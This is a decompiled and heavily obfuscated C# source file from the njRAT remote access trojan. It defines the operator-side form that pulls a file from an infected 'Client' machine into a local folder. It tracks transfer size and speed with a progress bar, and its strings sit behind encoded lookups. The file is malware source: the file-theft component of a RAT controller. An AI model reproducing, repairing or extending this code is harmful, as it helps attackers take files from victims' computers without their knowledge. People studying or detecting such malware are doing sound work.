using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x02000037 RID: 55
	[DesignerGenerated]
	public partial class DW : Form
	{
		// Token: 0x06000178 RID: 376 RVA: 0x00013AF4 File Offset: 0x00011CF4
		public DW()
		{
			base.FormClosing += this.\u0002;
			base.Load += this.\u0002;
			this.os = 0;
			this.\u0002();
		}

		// Token: 0x0600017A RID: 378 RVA: 0x00013B78 File Offset: 0x00011D78
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ListViewItem listViewItem = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829139097),
				string.Empty
			}, -1);
			ListViewItem listViewItem2 = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829139076),
				string.Empty
			}, -1);
			ListViewItem listViewItem3 = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829139087),
				string.Empty
			}, -1);
			ListViewItem listViewItem4 = new ListViewItem(new string[]
			{
				\u0006\u2001.\u0002(-1829139131),
				string.Empty
			}, -1);
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(DW));
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(new ProgressBar());
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(new Button());
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(new Timer(this.\u0002));
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(new \u000F\u2000());
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(new ColumnHeader());
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0003(new ColumnHeader());
			this.SuspendLayout();
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Bottom;
			Control control = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(0, 83);
			control.Location = location;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829138855);
			Control control2 = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(544, 23);
			control2.Size = size;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().TabIndex = 0;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Right;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			Control control3 = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002();
			location = new Point(469, 0);
			control3.Location = location;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139756);
			Control control4 = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002();
			size = new Size(75, 83);
			control4.Size = size;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().TabIndex = 2;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138787);
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().UseVisualStyleBackColor = false;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Interval = 1000;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().BorderStyle = BorderStyle.None;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Columns.AddRange(new ColumnHeader[]
			{
				this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(),
				this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0003()
			});
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Font = new Font(\u0006\u2001.\u0002(-1829139509), 8f, FontStyle.Bold);
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().FullRowSelect = true;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().GridLines = true;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().HeaderStyle = ColumnHeaderStyle.None;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new ListViewItem[]
			{
				listViewItem,
				listViewItem2,
				listViewItem3,
				listViewItem4
			});
			Control control5 = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control5.Location = location;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Name = \u0006\u2001.\u0002(-1829139116);
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().OwnerDraw = true;
			Control control6 = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002();
			size = new Size(469, 83);
			control6.Size = size;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().TabIndex = 3;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().UseCompatibleStateImageBehavior = false;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().View = View.Details;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Width = 80;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0003().Width = 373;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(544, 106);
			this.ClientSize = size;
			this.Controls.Add(this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002());
			this.Controls.Add(this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002());
			this.FormBorderStyle = FormBorderStyle.FixedSingle;
			this.Icon = (Icon)componentResourceManager.GetObject(\u0006\u2001.\u0002(-1829139480));
			this.MaximizeBox = false;
			this.Name = \u0006\u2001.\u0002(-1829139030);
			this.Text = \u0006\u2001.\u0002(-1829139030);
			this.ResumeLayout(false);
		}

		// Token: 0x0600017B RID: 379 RVA: 0x00013FE4 File Offset: 0x000121E4
		internal virtual ProgressBar gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003;
		}

		// Token: 0x0600017C RID: 380 RVA: 0x00013FF8 File Offset: 0x000121F8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(ProgressBar \u0002)
		{
			this.\u0003 = \u0002;
		}

		// Token: 0x0600017D RID: 381 RVA: 0x00014004 File Offset: 0x00012204
		internal virtual Button gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0005;
		}

		// Token: 0x0600017E RID: 382 RVA: 0x00014018 File Offset: 0x00012218
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(Button \u0002)
		{
			EventHandler value = delegate(object \u0002, EventArgs \u0003)
			{
				this.Button1_Click();
			};
			if (this.\u0005 != null)
			{
				this.\u0005.Click -= value;
			}
			this.\u0005 = \u00022;
			if (this.\u0005 != null)
			{
				this.\u0005.Click += value;
			}
		}

		// Token: 0x0600017F RID: 383 RVA: 0x00014068 File Offset: 0x00012268
		internal virtual Timer gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0008;
		}

		// Token: 0x06000180 RID: 384 RVA: 0x0001407C File Offset: 0x0001227C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(Timer \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003);
			if (this.\u0008 != null)
			{
				this.\u0008.Tick -= value;
			}
			this.\u0008 = \u0002;
			if (this.\u0008 != null)
			{
				this.\u0008.Tick += value;
			}
		}

		// Token: 0x06000181 RID: 385 RVA: 0x000140CC File Offset: 0x000122CC
		internal virtual \u000F\u2000 gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006;
		}

		// Token: 0x06000182 RID: 386 RVA: 0x000140E0 File Offset: 0x000122E0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(\u000F\u2000 \u0002)
		{
			this.\u0006 = \u0002;
		}

		// Token: 0x06000183 RID: 387 RVA: 0x000140EC File Offset: 0x000122EC
		internal virtual ColumnHeader gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000E;
		}

		// Token: 0x06000184 RID: 388 RVA: 0x00014100 File Offset: 0x00012300
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002(ColumnHeader \u0002)
		{
			this.\u000E = \u0002;
		}

		// Token: 0x06000185 RID: 389 RVA: 0x0001410C File Offset: 0x0001230C
		internal virtual ColumnHeader gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000F;
		}

		// Token: 0x06000186 RID: 390 RVA: 0x00014120 File Offset: 0x00012320
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0003(ColumnHeader \u0002)
		{
			this.\u000F = \u0002;
		}

		// Token: 0x06000187 RID: 391 RVA: 0x0001412C File Offset: 0x0001232C
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			try
			{
				this.FS.Close();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.FS.Dispose();
			}
			catch (Exception ex2)
			{
			}
			try
			{
				File.Delete(this.tmp);
			}
			catch (Exception ex3)
			{
			}
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Enabled = false;
			this.c.CN = false;
		}

		// Token: 0x06000188 RID: 392 RVA: 0x000141DC File Offset: 0x000123DC
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			this.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(\u000E\u2000.\u0002(this.osk.L), \u0006\u2001.\u0002(-1829139039)), global::\u000E.\u0003(this.FN)));
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Maximum = this.SZ;
			this.folder = this.osk.Folder + \u0006\u2001.\u0002(-1829139017);
			if (!Directory.Exists(this.folder))
			{
				Directory.CreateDirectory(this.folder);
			}
			this.folder += new FileInfo(global::\u000E.\u0003(this.FN)).Name;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Items[0].SubItems[1].Text = new FileInfo(global::\u000E.\u0003(this.FN)).Name;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Items[1].SubItems[1].Text = global::\u000E.\u0002((long)this.SZ);
			do
			{
				this.tmp = Interaction.Environ(\u0006\u2001.\u0002(-1829138643)) + \u0006\u2001.\u0002(-1829139066) + global::\u000E.\u0002(10);
			}
			while (File.Exists(this.tmp));
			this.FS = new FileStream(this.tmp, FileMode.Append);
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Items[2].SubItems[1].Text = global::\u000E.\u0002((long)(checked(this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Value - this.os)));
			this.os = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Value;
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Items[3].SubItems[1].Text = global::\u000E.\u0002((long)this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Value);
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().\u0005();
			this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Enabled = true;
		}

		// Token: 0x06000189 RID: 393 RVA: 0x000143DC File Offset: 0x000125DC
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			try
			{
				this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Items[2].SubItems[1].Text = global::\u000E.\u0002((long)(checked(this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Value - this.os)));
				this.os = this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Value;
				this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Items[3].SubItems[1].Text = global::\u000E.\u0002((long)this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Value);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600018A RID: 394 RVA: 0x0001448C File Offset: 0x0001268C
		public void Button1_Click()
		{
			if (Operators.CompareString(this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138787), false) == 0)
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Delete(this.tmp);
				this.gng9dgyujfqxgme5bxe9aw5zemz7ep94\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.c.CN = false;
				this.Close();
			}
			else
			{
				this.FS.Close();
				this.FS.Dispose();
				File.Move(this.tmp, this.folder);
			}
		}

		// Token: 0x04000124 RID: 292
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar \u0003;

		// Token: 0x04000125 RID: 293
		[AccessedThroughProperty("Button1")]
		private Button \u0005;

		// Token: 0x04000126 RID: 294
		[AccessedThroughProperty("Timer1")]
		private Timer \u0008;

		// Token: 0x04000127 RID: 295
		[AccessedThroughProperty("Lv1")]
		private \u000F\u2000 \u0006;

		// Token: 0x04000128 RID: 296
		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader \u000E;

		// Token: 0x04000129 RID: 297
		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader \u000F;

		// Token: 0x0400012A RID: 298
		public FileStream FS;

		// Token: 0x0400012B RID: 299
		public string FN;

		// Token: 0x0400012C RID: 300
		public int SZ;

		// Token: 0x0400012D RID: 301
		public Client c;

		// Token: 0x0400012E RID: 302
		public Client osk;

		// Token: 0x0400012F RID: 303
		public string tmp;

		// Token: 0x04000130 RID: 304
		public int os;

		// Token: 0x04000131 RID: 305
		public string folder;
	}
}
